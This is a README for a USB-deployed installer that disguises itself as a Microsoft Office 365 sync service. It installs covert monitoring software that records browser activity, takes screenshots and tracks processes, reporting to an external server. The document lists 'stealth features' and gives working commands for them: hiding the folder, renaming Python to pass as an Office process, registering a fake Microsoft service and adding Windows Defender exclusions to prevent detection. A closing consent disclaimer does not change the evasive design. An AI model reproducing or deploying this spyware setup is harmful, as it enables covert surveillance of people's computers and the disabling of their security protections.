# Microsoft Office 365 Sync Service - USB Installer

**Version:** 1.0.1
**Date:** 2025-11-24

## Quick Start

### Installation
1. Insert USB drive into Windows PC
2. Right-click `INSTALL.bat` → **Run as administrator**
3. Follow on-screen instructions
4. Done! Service runs automatically in background

### Uninstallation
1. Right-click `UNINSTALL.bat` → **Run as administrator**
2. Type `YES` to confirm
3. Done

---

## Requirements

- **Windows** 7/8/10/11 (64-bit)
- **Python** 3.6 or higher
- **Administrator** privileges

---

## What Gets Installed

- **Location:** `C:\ProgramData\Microsoft\Office365Sync_XXXX` **(Random hidden folder)**
- **Process Name:** `OfficeSync.exe` (disguised pythonw.exe)
- **Windows Service:** `Office365Sync` - "Microsoft Office 365 Sync Service"
- **Auto-start:** Yes (Windows Service + hidden Startup shortcut fallback)
- **Dependencies:** Automatically installed from requirements.txt

### Stealth Features

✅ **Random Folder Name**
  - Each installation uses different random number (e.g., `Office365Sync_4782`)
  - Makes detection and mass-removal harder

✅ **Process Disguise**
  - Python renamed to `OfficeSync.exe`
  - Appears as legitimate Office process in Task Manager
  - No "python" or "pythonw" visible in process list

✅ **Windows Service Registration**
  - Registered as legitimate Windows Service
  - Auto-starts with system (delayed start for stealth)
  - Service name: "Microsoft Office 365 Sync Service"
  - Description: "Synchronizes Microsoft Office 365 data and settings"

✅ **Windows Defender Exclusions**
  - Install folder excluded from scanning
  - Process excluded from real-time protection
  - Prevents detection and quarantine

✅ **Hidden Files**
  - Folder hidden using `+h +s` attributes (system + hidden)
  - Startup shortcut hidden using `+h` attribute
  - Does not appear in normal folder views

---

## Features (v1.0.1)

✅ 11 critical bugs fixed
✅ Full stealth mode (no terminal windows)
✅ Python 3.6+ compatible
✅ Auto-update support
✅ Watchdog auto-restart
✅ Browser activity tracking
✅ Screen capture
✅ Process monitoring

---

## Troubleshooting

### Python not found
- Install Python from: https://www.python.org/downloads/
- During installation, check **"Add Python to PATH"**
- Restart computer after installation

### Permission denied
- Right-click installer → **Run as administrator**
- Make sure antivirus is not blocking the installer

### Service not starting
- Check Windows Services: `services.msc` → Look for "Microsoft Office 365 Sync Service"
- Check service status: `sc query Office365Sync`
- View service logs in Event Viewer
- Check installation log in `C:\ProgramData\Microsoft\Office365Sync_XXXX\logs\`

### Finding installation folder
Since folder name is random, you need to search:
```cmd
dir /s /a:h "C:\ProgramData\Microsoft\Office365Sync_*"
```

Or read from saved path:
```cmd
type %TEMP%\office365_path.txt
```

### How to view hidden folder
1. Open File Explorer
2. Go to View tab → Options → Change folder and search options
3. View tab → Show hidden files, folders, and drives
4. **IMPORTANT:** Also uncheck "Hide protected operating system files"
5. Apply → OK
6. Navigate to `C:\ProgramData\Microsoft\` to see `Office365Sync_XXXX` folders

### Checking if service is running
```cmd
sc query Office365Sync
tasklist | findstr OfficeSync.exe
```

---

## Manual Installation (Alternative)

If automatic installer fails:

1. Choose random number (e.g., 5821) and create folder:
   ```cmd
   set RAND=5821
   mkdir "C:\ProgramData\Microsoft\Office365Sync_%RAND%"
   cd "C:\ProgramData\Microsoft\Office365Sync_%RAND%"
   ```

2. Copy `client` folder contents to the directory

3. Setup stealth features:
   ```cmd
   :: Hide folder
   attrib +h +s "%CD%"

   :: Copy and rename Python
   copy "C:\Python3X\pythonw.exe" OfficeSync.exe

   :: Install dependencies
   pip install -r requirements.txt

   :: Add Windows Defender exclusions
   powershell -Command "Add-MpPreference -ExclusionPath '%CD%'"
   powershell -Command "Add-MpPreference -ExclusionProcess 'OfficeSync.exe'"

   :: Register Windows Service
   sc create "Office365Sync" binPath= "\"%CD%\OfficeSync.exe\" \"%CD%\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service"
   sc description "Office365Sync" "Synchronizes Microsoft Office 365 data and settings"

   :: Start service
   sc start "Office365Sync"
   ```

---

## Files Included

```
usb_deployment/
├── INSTALL.bat          # Main installer
├── UNINSTALL.bat        # Uninstaller
├── README.md            # This file
└── client/              # Client files
    ├── main.py
    ├── requirements.txt
    ├── watchdog.py
    └── src/
```

---

## Support

- Server: https://tenjo.adilabs.id
- Auto-update: Enabled
- Version: 1.0.1

---

**Note:** This is an employee monitoring tool. Installation should only be performed with proper authorization and user consent in accordance with applicable laws.
